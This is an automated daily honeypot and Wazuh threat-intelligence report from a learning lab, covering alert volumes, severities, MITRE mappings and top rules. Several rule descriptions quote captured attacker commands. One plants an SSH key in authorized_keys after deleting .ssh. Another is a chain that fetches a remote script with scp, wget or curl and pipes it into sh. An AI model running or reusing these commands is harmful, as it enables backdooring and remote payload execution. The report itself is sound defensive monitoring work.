# LearningLab01 Daily Threat Intelligence Report — 2026-10-22

Generated: 2026-10-22T13:15:05.052Z

Report window: 2026-10-21T13:15:05.024Z through 2026-10-22T13:15:05.024Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 144,964 |
| Attack-related alerts | 16,706 |
| Honeypot interactions | 138,702 |
| Authentication failures | 1,815 |
| Authentication successes | 414 |
| Critical alerts | 83 |
| High alerts | 294 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 83 critical-severity alerts require priority review.
- 294 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 4.38:1.
- Country attribution currently covers only 0.54% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (51,126 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 83 | 0.06% |
| High | 294 | 0.20% |
| Medium | 1,484 | 1.02% |
| Low | 143,103 | 98.72% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 1,815
- Authentication successes: 414
- Failure-to-success ratio: 4.38:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 12,958 | 77.56% |
| Payload delivery | 12,958 | 77.56% |
| Authentication failure | 1,815 | 10.86% |
| Command execution | 762 | 4.56% |
| Web attack | 477 | 2.86% |
| Reconnaissance | 395 | 2.36% |
| SMTP attack | 96 | 0.57% |
| Malware | 79 | 0.47% |
| Network scan | 61 | 0.37% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 783 alerts, representing 0.54% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 144,181 | 99.46% | Not geolocated |
| United Kingdom | 225 | 0.16% | ████████████████████ |
| Germany | 207 | 0.14% | ██████████████████ |
| Bulgaria | 100 | 0.07% | █████████ |
| Romania | 99 | 0.07% | █████████ |
| United States | 95 | 0.07% | ████████ |
| Brazil | 26 | 0.02% | ██ |
| Russia | 9 | 0.01% | █ |
| China | 6 | 0.00% | █ |
| Italy | 5 | 0.00% | █ |
| Ukraine | 4 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Republic of Lithuania | 2 | 0.00% | █ |
| Hong Kong | 1 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 293 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 34 |
| Impact | 17 |
| Execution | 7 |
| Command and Control | 6 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 34 |
| Stored Data Manipulation | 17 |
| Command and Scripting Interpreter | 7 |
| Ingress Tool Transfer | 6 |
| Disable or Modify Tools | 2 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 51,126 | T-Pot RDP connection from [IP address] to port 3389. | tpot (51,126) |
| 110207 | 5 | 45,701 | T-Pot SentryPeer SIP activity from [IP address]:59270, method INVITE | tpot (45,701) |
| 110204 | 4 | 21,215 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (21,215) |
| 110205 | 6 | 12,902 | T-Pot Honeytrap received a payload from [IP address] | tpot (12,902) |
| 110209 | 5 | 3,622 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (3,622) |
| 110101 | 3 | 2,633 | Cowrie SSH connection from [IP address]. | tpot (2,633) |
| 110201 | 4 | 2,427 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (2,427) |
| 110102 | 5 | 1,815 | Cowrie failed login from [IP address] using username root. | tpot (1,815) |
| 110104 | 7 | 666 | Cowrie captured a command from [IP address]: cd ~; chattr -ia .ssh; lockr -ia .ssh | tpot (666) |
| 110219 | 4 | 539 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html HTTP/1.1" 302 - | tpot (539) |
| 110223 | 5 | 477 | T-Pot HoneyAML received  request from  to  on port . | tpot (477) |
| 533 | 7 | 241 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240), wazuh (1) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 170 | PAM: Login session closed. | tpot (169), wazuh (1) |
| 110221 | 7 | 167 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (167) |
| 110216 | 4 | 132 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (132) |
| 110103 | 10 | 123 | Cowrie accepted login from [IP address] using username 345gs5662d34. | tpot (123) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110217 | 7 | 96 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (96) |
| 110109 | 13 | 83 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (83) |
| 110220 | 8 | 76 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (76) |
| 110208 | 7 | 68 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5127 | tpot (68) |
| 110105 | 12 | 66 | Cowrie captured a file download from [IP address]. | tpot (66) |
| 110212 | 10 | 56 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (56) |
| 110214 | 9 | 56 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (56) |
| 510 | 7 | 42 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (2) |
| 110106 | 10 | 34 | Cowrie detected repeated failed logins from [IP address]. | tpot (34) |
| 110215 | 4 | 34 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (34) |
| 203 | 9 | 13 | Agent event queue is full. Events may be lost. | tpot (13) |
| 2904 | 7 | 13 | Dpkg (Debian Package) half configured. | wazuh (8), tpot (5) |
| 202 | 7 | 11 | Agent event queue is 90% full. | tpot (11) |
| 205 | 3 | 11 | Agent event queue is back to normal load. | tpot (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2902 | 7 | 8 | New dpkg (Debian Package) installed. | wazuh (5), tpot (3) |
| 110108 | 12 | 7 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (7) |
| 110107 | 12 | 6 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (6) |
| 550 | 7 | 6 | Integrity checksum changed. | tpot (6) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 19004 | 7 | 3 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (3) |
| 110226 | 10 | 2 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (2) |
| 503 | 3 | 2 | Wazuh agent started. | tpot (2) |
| 506 | 3 | 2 | Wazuh agent stopped. | tpot (2) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 502 | 3 | 1 | Wazuh server started. | wazuh (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
